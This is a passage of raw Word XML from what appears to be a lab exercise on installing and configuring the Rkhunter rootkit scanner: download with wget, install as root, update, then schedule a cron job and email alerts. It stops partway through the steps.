        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>OO</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ITS</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="3" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1580" w:bottom="280" w:left="1140" w:header="0" w:footer="1185" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="29"/>
        <w:ind w:left="100" w:right="-56"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>m:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="column"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1580" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:num="2" w:space="720" w:equalWidth="0">
            <w:col w:w="620" w:space="190"/>
            <w:col w:w="8370"/>
          </w:cols>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-17"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve">o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ns</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>exp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ore</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>he var</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ous op</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ons of Rkhun</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>er roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>scann</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-14"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="12" w:line="240" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="29"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>gor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>thm:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="340" w:right="1603" w:hanging="240"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:t>own</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>oad</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>rkhun</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">er </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ool</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>tt</w:t>
      </w:r>
      <w:r>
        <w:t>ps</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:t>roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>.n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>pro</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>_hun</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>.h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">l or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>e-</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId81">
        <w:r>
          <w:t>h</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>tt</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="2"/>
          </w:rPr>
          <w:t>p</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>://</w:t>
        </w:r>
        <w:r>
          <w:t>down</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>l</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="2"/>
          </w:rPr>
          <w:t>o</w:t>
        </w:r>
        <w:r>
          <w:t>ads.sourcefo</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-6"/>
          </w:rPr>
          <w:t>r</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="2"/>
          </w:rPr>
          <w:t>g</w:t>
        </w:r>
        <w:r>
          <w:t>e.ne</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>t/</w:t>
        </w:r>
        <w:r>
          <w:t>pr</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="2"/>
          </w:rPr>
          <w:t>o</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>j</w:t>
        </w:r>
        <w:r>
          <w:t>e</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="1"/>
          </w:rPr>
          <w:t>c</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>t/</w:t>
        </w:r>
        <w:r>
          <w:t>rkhun</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="1"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
        <w:r>
          <w:t>er</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>/</w:t>
        </w:r>
        <w:r>
          <w:t>rkhun</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
        <w:r>
          <w:t>e</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="2"/>
          </w:rPr>
          <w:t>r</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>/</w:t>
        </w:r>
        <w:r>
          <w:t>1.4.2</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>rkhun</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>1.4.2.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>.gz</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>U</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>z</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">p </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ns</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>rkhun</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>as a root</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>use</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">3. Run </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he RKH upda</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o get</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>est</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>upda</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">es </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>da</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>abase</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>4. Se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>tti</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">cron </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>ob and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>5. Set</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>exec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e pe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
